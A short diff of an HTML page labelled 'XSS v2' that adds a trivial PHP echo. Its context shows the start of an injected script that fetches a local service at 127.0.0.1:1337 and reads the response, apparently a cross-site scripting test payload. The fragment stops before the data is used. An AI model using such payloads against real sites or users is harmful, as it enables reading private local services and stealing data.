@@ -1,5 +1,8 @@
 <body>
   <p>XSS v2</p>
+  <?php
+echo "hi"
+?>
 <script>
 fetch('http://127.0.0.1:1337/', {mode: 'no-cors'}).then(function(r) {
   r.text().then(function(f) {
